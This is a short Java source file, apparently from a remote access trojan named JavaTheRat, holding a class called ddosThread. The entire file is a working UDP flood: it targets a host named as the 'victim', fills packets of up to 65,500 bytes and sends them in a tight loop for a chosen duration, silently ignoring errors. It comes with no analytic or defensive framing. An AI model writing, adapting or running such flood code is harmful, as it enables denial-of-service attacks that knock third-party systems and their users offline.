package javatheratserver;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class ddosThread implements Runnable{
	
	private String ip;
	private int port;
	private long time;
	private int packetsize;
	
	ddosThread(String ip, int port, int seconds, int packetsize){
		this.ip = ip;
		this.port = port;
		this.time = seconds * 1000;
		this.packetsize = packetsize;
	}

	public void run(){
		long startTime = System.currentTimeMillis();
		
		packetsize = Math.abs(packetsize);
		if (packetsize > 65500){
			packetsize = 65500;
		}
		
		byte[] buffer = new byte[packetsize];
		DatagramSocket udp = null;
		InetAddress victim = null;
		
		try {
			udp = new DatagramSocket();
			victim = InetAddress.getByName(ip);
		} catch (Exception e) {}
		
		DatagramPacket packet = new DatagramPacket(buffer, buffer.length, victim, port);
		
		while(System.currentTimeMillis() - startTime < time){
			try {
				udp.send(packet);
			} catch (Exception e) {}
		}
	}
}

//Copyright JavaTheRat, 2013
